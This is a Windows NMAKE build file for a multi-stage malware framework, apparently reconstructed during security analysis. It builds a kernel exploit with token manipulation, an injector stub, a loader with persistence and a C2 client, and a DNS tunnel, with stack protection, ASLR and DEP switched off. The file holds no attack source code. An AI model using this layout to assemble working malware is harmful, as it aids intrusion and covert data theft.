# PE5 Exploit Framework - Build System
#
# RECONSTRUCTED FROM SECURITY ANALYSIS
# Classification: TLP:RED - Security Research Only
#
# Requirements:
#   - Visual Studio Build Tools (cl.exe, ml64.exe, link.exe)
#   - Windows SDK
#
# Usage:
#   nmake all        - Build all modules
#   nmake pe5        - Build PE #5 only
#   nmake clean      - Clean build artifacts

#=============================================================================
# CONFIGURATION
#=============================================================================

# Compiler settings
CC = cl.exe
AS = ml64.exe
LINK = link.exe
RC = rc.exe

# Output directories
OUTDIR = build
BINDIR = $(OUTDIR)\bin
OBJDIR = $(OUTDIR)\obj

# Common compiler flags
CFLAGS = /nologo /W4 /WX /O2 /GS- /Gy /EHsc
CFLAGS = $(CFLAGS) /D "WIN32" /D "NDEBUG" /D "_WINDOWS"
CFLAGS = $(CFLAGS) /I "common"

# Linker flags
LDFLAGS = /nologo /RELEASE /OPT:REF /OPT:ICF /DYNAMICBASE:NO /NXCOMPAT:NO

# Assembler flags
ASFLAGS = /nologo /c /Cx

# Libraries
LIBS = kernel32.lib user32.lib advapi32.lib ntdll.lib

#=============================================================================
# TARGETS
#=============================================================================

all: dirs pe5 pe4 pe1 pe2 pe3
	@echo.
	@echo ========================================
	@echo BUILD COMPLETE
	@echo ========================================
	@echo Output: $(BINDIR)
	@dir /B $(BINDIR)

dirs:
	@if not exist $(OUTDIR) mkdir $(OUTDIR)
	@if not exist $(BINDIR) mkdir $(BINDIR)
	@if not exist $(OBJDIR) mkdir $(OBJDIR)

clean:
	@if exist $(OUTDIR) rmdir /S /Q $(OUTDIR)
	@echo Cleaned.

#=============================================================================
# PE #5 - KERNEL EXPLOIT
#=============================================================================

PE5_OBJS = $(OBJDIR)\exploit.obj $(OBJDIR)\token_manipulation.obj \
           $(OBJDIR)\decryption.obj $(OBJDIR)\exploit_asm.obj

pe5: dirs $(BINDIR)\pe5_exploit.dll $(BINDIR)\pe5_exploit.exe
	@echo PE #5 built successfully.

$(OBJDIR)\exploit.obj: pe5_exploit\exploit.c pe5_exploit\exploit.h
	$(CC) $(CFLAGS) /c /Fo$@ pe5_exploit\exploit.c

$(OBJDIR)\token_manipulation.obj: pe5_exploit\token_manipulation.c
	$(CC) $(CFLAGS) /c /Fo$@ pe5_exploit\token_manipulation.c

$(OBJDIR)\decryption.obj: pe5_exploit\decryption.c
	$(CC) $(CFLAGS) /c /Fo$@ pe5_exploit\decryption.c

$(OBJDIR)\exploit_asm.obj: pe5_exploit\exploit_asm.asm
	$(AS) $(ASFLAGS) /Fo$@ pe5_exploit\exploit_asm.asm

$(BINDIR)\pe5_exploit.dll: $(PE5_OBJS)
	$(LINK) $(LDFLAGS) /DLL /OUT:$@ /ENTRY:DllMain $(PE5_OBJS) $(LIBS)

$(BINDIR)\pe5_exploit.exe: $(PE5_OBJS)
	$(LINK) $(LDFLAGS) /OUT:$@ /ENTRY:PE5_ExploitMain $(PE5_OBJS) $(LIBS)

#=============================================================================
# PE #4 - STUB LAUNCHER
#=============================================================================

PE4_OBJS = $(OBJDIR)\stub.obj $(OBJDIR)\injector.obj

pe4: dirs $(BINDIR)\pe4_stub.dll $(BINDIR)\pe4_stub.exe
	@echo PE #4 built successfully.

$(OBJDIR)\stub.obj: pe4_stub\stub.c pe4_stub\stub.h
	$(CC) $(CFLAGS) /c /Fo$@ pe4_stub\stub.c

$(OBJDIR)\injector.obj: pe4_stub\injector.c
	$(CC) $(CFLAGS) /c /Fo$@ pe4_stub\injector.c

$(BINDIR)\pe4_stub.dll: $(PE4_OBJS)
	$(LINK) $(LDFLAGS) /DLL /OUT:$@ /ENTRY:DllMain $(PE4_OBJS) $(LIBS)

$(BINDIR)\pe4_stub.exe: $(PE4_OBJS)
	$(LINK) $(LDFLAGS) /OUT:$@ /ENTRY:PE4_StubMain $(PE4_OBJS) $(LIBS)

#=============================================================================
# PE #1 - MAIN LOADER
#=============================================================================

PE1_OBJS = $(OBJDIR)\loader.obj $(OBJDIR)\persistence.obj $(OBJDIR)\c2_client.obj

pe1: dirs $(BINDIR)\pe1_loader.dll $(BINDIR)\pe1_loader.exe
	@echo PE #1 built successfully.

$(OBJDIR)\loader.obj: pe1_loader\loader.c pe1_loader\loader.h
	$(CC) $(CFLAGS) /c /Fo$@ pe1_loader\loader.c

$(OBJDIR)\persistence.obj: pe1_loader\persistence.c
	$(CC) $(CFLAGS) /c /Fo$@ pe1_loader\persistence.c

$(OBJDIR)\c2_client.obj: pe1_loader\c2_client.c
	$(CC) $(CFLAGS) /c /Fo$@ pe1_loader\c2_client.c

$(BINDIR)\pe1_loader.dll: $(PE1_OBJS)
	$(LINK) $(LDFLAGS) /DLL /OUT:$@ /ENTRY:DllMain $(PE1_OBJS) $(LIBS) winhttp.lib

$(BINDIR)\pe1_loader.exe: $(PE1_OBJS)
	$(LINK) $(LDFLAGS) /OUT:$@ /ENTRY:PE1_LoaderMain $(PE1_OBJS) $(LIBS) winhttp.lib

#=============================================================================
# PE #2 - DNS TUNNEL
#=============================================================================

PE2_OBJS = $(OBJDIR)\dns_tunnel.obj

pe2: dirs $(BINDIR)\pe2_dns.dll
	@echo PE #2 built successfully.

$(OBJDIR)\dns_tunnel.obj: pe2_dns_tunnel\dns_tunnel.c
	$(CC) $(CFLAGS) /c /Fo$@ pe2_dns_tunnel\dns_tunnel.c

$(BINDIR)\pe2_dns.dll: $(PE2_OBJS)
	$(LINK) $(LDFLAGS) /DLL /OUT:$@ $(PE2_OBJS) $(LIBS) dnsapi.lib crypt32.lib

#=============================================================================
# PE #3 - CONTAINER
#=============================================================================

PE3_OBJS = $(OBJDIR)\container.obj

pe3: dirs $(BINDIR)\pe3_container.dll
	@echo PE #3 built successfully.

$(OBJDIR)\container.obj: pe3_container\container.c
	$(CC) $(CFLAGS) /c /Fo$@ pe3_container\container.c

$(BINDIR)\pe3_container.dll: $(PE3_OBJS)
	$(LINK) $(LDFLAGS) /DLL /OUT:$@ $(PE3_OBJS) $(LIBS)

#=============================================================================
# COMMON UTILITIES
#=============================================================================

$(OBJDIR)\xor_crypto.obj: common\xor_crypto.c
	$(CC) $(CFLAGS) /c /Fo$@ common\xor_crypto.c

#=============================================================================
# PHONY TARGETS
#=============================================================================

.PHONY: all dirs clean pe5 pe4 pe1 pe2 pe3
